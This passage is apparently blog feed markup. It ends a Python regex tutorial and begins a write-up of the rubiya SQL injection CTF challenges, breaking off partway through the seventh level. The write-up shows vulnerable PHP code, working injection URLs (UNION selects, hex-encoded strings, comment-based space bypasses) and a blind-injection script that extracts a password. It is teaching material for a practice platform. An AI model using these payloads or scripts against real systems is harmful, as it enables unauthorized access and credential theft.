re</span><br><span class="line"></span><br><span class="line">s = re.search(<span class="string">&quot;\d&#123;3,6&#125;&quot;</span>,<span class="string">&#x27;123456789&#x27;</span>)</span><br><span class="line">print(s.group())</span><br><span class="line"><span class="comment"># output: 123456</span></span><br><span class="line"><span class="comment"># 贪婪模式匹配最多的情况</span></span><br><span class="line"></span><br><span class="line">s = re.search(<span class="string">&quot;\d&#123;3,6&#125;?&quot;</span>,<span class="string">&#x27;123456789&#x27;</span>)</span><br><span class="line"><span class="comment"># output: 123，后面加个问号，非贪婪模式，匹配最小3个的情况</span></span><br><span class="line"></span><br><span class="line">a.*?b： 匹配最短的，以a开始，以b结尾的字符串</span><br></pre></td></tr></table></figure><p><strong>分组</strong></p><p><code>abc&#123;2&#125;</code>：不分组，只重复最后一个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.search(<span class="string">&quot;abc&#123;2&#125;&quot;</span>,<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s.group())</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;group&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.search(<span class="string">&quot;abc&#123;2&#125;&quot;</span>,<span class="string">&#x27;abcc&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s.group())</span><br><span class="line">abcc</span><br></pre></td></tr></table></figure><p><code>(abc)&#123;2&#125;</code>：重复abc两次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.search(<span class="string">&quot;(abc)&#123;2&#125;&quot;</span>,<span class="string">&#x27;abcabc&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s.group())</span><br><span class="line">abcabc</span><br></pre></td></tr></table></figure><p>用小括号指定一个表达式后，每个分组自动拥有一个组号，从1开始编号。</p><p><code>\b(\w+)\b\s+\1\b</code>：可以匹配两个空格间隔的单词，如，<code>go go</code></p><p><code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code>：可以使用组名来替代组的编号</p><p><strong>零宽断言</strong></p><p>用于查找某些内容，但又不占用这个位置，称为零宽断言。</p><p><code>(?=exp)</code>：比如<code>\b\w+(?=ing)\b</code>可以匹配以ing结尾的前面部分，如<code>dancing</code>会匹配danc</p><p><code>(?&lt;=exp)</code>：比如<code>(?&lt;=\bre)\w+\b</code>可以匹配re开头的单词的后半部分，如<code>reading</code>会匹配ading</p><p><strong>负向零宽断言</strong></p><p>表示某个字符或者某个字符串不在里面的方法，类似于<code>[^abc]</code>，但这种方式只能判断单个字符，如果表示字符串不包含<code>abc</code>整体，则要用到负向零宽断言</p><p><code>(?!exp)</code>：<code>\b((?!abc)\w)+</code>表示不包含abc连续字符的单词</p><h1 id="0x02-python-re模块"><a href="#0x02-python-re模块" class="headerlink" title="0x02 python re模块"></a>0x02 python re模块</h1><p><code>re.compile(pattern, flags=0)</code>：编译正则表达式为一个对象，flag为标记为，可以使用<code>|</code>进行结合，可能的值有如下几种：</p><p><code>re.A</code>、<code>re.ASCII</code>：让<code>\w</code> <code>\W</code> <code>\b</code> <code>\B</code> <code>\D</code> <code>\d</code> <code>s</code> <code>\S</code>只匹配ASCII，忽略unicode</p><p><code>re.I</code>、<code>re.IGNORECASE</code>：忽略匹配大小写</p><p><code>re.M</code>、<code>re.MULTILINE</code>：匹配多行字符</p><p><strong>常用函数</strong></p><p><code>re.search(pattern, string, flag=0)</code>：扫描整个字符串，匹配到第一个就返回，并返回一个匹配对象，没有匹配返回None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.search(<span class="string">&quot;(abc)&#123;2&#125;&quot;</span>,<span class="string">&#x27;abcabc&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s.group())</span><br><span class="line">abcabc</span><br></pre></td></tr></table></figure><p><code>re.match(pattern, string, flag=0)</code>：从字符串开头进行匹配，并返回一个匹配对象，没有匹配返回None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.match(<span class="string">&quot;abc\d+&quot;</span>, <span class="string">&quot;abc1&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s.group())</span><br><span class="line">abc1</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.match(<span class="string">&quot;abc\d+&quot;</span>, <span class="string">&quot;12312abc1&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s.group())</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;group&#x27;</span></span><br></pre></td></tr></table></figure><p><code>re.split(pattern, string, maxsplit=0, flags=0)</code>：用正则去分割字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.split(<span class="string">&#x27;[a-f]+&#x27;</span>, <span class="string">&#x27;a1b2321c912d9&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2321&#x27;</span>, <span class="string">&#x27;912&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]  <span class="comment"># 如果字符串第一个匹配成功，list第一位为空</span></span><br></pre></td></tr></table></figure><p><code>re.findalll(pattern, string, flags=0)</code>：将匹配到的返回一个列表组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = re.findall(<span class="string">&#x27;abc&#x27;</span>, <span class="string">&quot;abcskodqwabcjiabc&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line">[<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>]</span><br></pre></td></tr></table></figure><p><strong>分组</strong></p><p>如果正则中有括号进行分组，可以用group加上编号进行读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r&quot;(\w+) (\w+)&quot;</span>, <span class="string">&quot;Isaac Newton, physicist&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;Isaac Newton&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;Isaac&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;Newton&#x27;</span></span><br></pre></td></tr></table></figure><p>分组号有名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r&quot;(?P&lt;first_name&gt;\w+) (?P&lt;last_name&gt;\w+)&quot;</span>, <span class="string">&quot;Malcolm Reynolds&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="string">&#x27;first_name&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;Malcolm&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="string">&#x27;last_name&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;Reynolds&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></li><li><a href="https://segmentfault.com/a/1190000013075245">https://segmentfault.com/a/1190000013075245</a></li><li><a href="https://segmentfault.com/a/1190000000426455">https://segmentfault.com/a/1190000000426455</a></li><li><a href="https://regexper.com/#">正则表达式图形化分析工具</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-基本语法&quot;&gt;&lt;a href=&quot;#0x01-基本语法&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本语法&quot;&gt;&lt;/a&gt;0x01 基本语法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;修饰符（g i m）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;g</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="正则" scheme="http://blog.le31ei.top/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>rubiya注入题目writeup</title>
    <link href="http://blog.le31ei.top/2020/11/19/rubiya%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AEwriteup/"/>
    <id>http://blog.le31ei.top/2020/11/19/rubiya%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AEwriteup/</id>
    <published>2020-11-19T06:42:21.000Z</published>
    <updated>2020-11-19T06:42:21.462Z</updated>
    
    <content type="html"><![CDATA[<p>最近复习注入，便找了许多ctf题目来做，这个题目一共48道注入题，记录一下解题过程。</p><p>平台地址为：<a href="https://los.rubiya.kr/">https://los.rubiya.kr/</a></p><h1 id="1-gremlin"><a href="#1-gremlin" class="headerlink" title="1. gremlin"></a>1. gremlin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  $query = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;gremlin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题很简单，最基础的注入。</p><p><code>https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=1%27+or+%271%27--+</code></p><h1 id="2-cobolt"><a href="#2-cobolt" class="headerlink" title="2. cobolt"></a>2. cobolt</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br><span class="line">  <span class="keyword">elseif</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=a%27+union+select+%27admin%27--+</code></p><h1 id="3-goblin"><a href="#3-goblin" class="headerlink" title="3. goblin"></a>3. goblin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;|\&quot;|\`/i&#x27;</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">&quot;No Quotes ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_goblin where id=&#x27;guest&#x27; and no=<span class="subst">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;goblin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了单引号，只需要将no参数转换为16进制即可</p><p><code>https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=-2+union+select+0x61646d696e--+</code></p><h1 id="4-orc"><a href="#4-orc" class="headerlink" title="4.orc"></a>4.orc</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class="string">&#x27;pw&#x27;</span>] == $_GET[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对pw进行了addslashed过滤，无法进行绕过，需要在注入点进行盲注，写了个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;xxxx&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;123&#x27;+or+ascii(substr(pw,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.get(<span class="string">&quot;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=&quot;</span>+payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">ord</span>(s)), </span><br><span class="line">            cookies=cookie, proxies=&#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class="line">            verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            temp = temp+s</span><br><span class="line">            print(temp)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注入出来pw的值为<code>095a9852</code>，传入该值，即可通关</p><h1 id="5-Walfman"><a href="#5-Walfman" class="headerlink" title="5. Walfman"></a>5. Walfman</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ /i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No whitespace ~_~&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;wolfman&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了空格，可以用<code>/**/</code>注释进行绕过</p><p><code>https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=an&#39;/**/union/**/select/**/&#39;admin&#39;%23</code></p><h1 id="6-darkelf"><a href="#6-darkelf" class="headerlink" title="6. darkelf"></a>6. darkelf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect();  </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;darkelf&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了or，and，真不知过滤这个有啥用，可以直接用上一题的payload</p><p>``<a href="https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=123&#39;+union+select+&#39;admin&#39;%23%60">https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=123&#39;+union+select+&#39;admin&#39;%23`</a></p><h1 id="7-orge"><a href="#7-orge" class="headerlink" title="7. orge"></a>7. orge</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  $query = <span class="string">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span 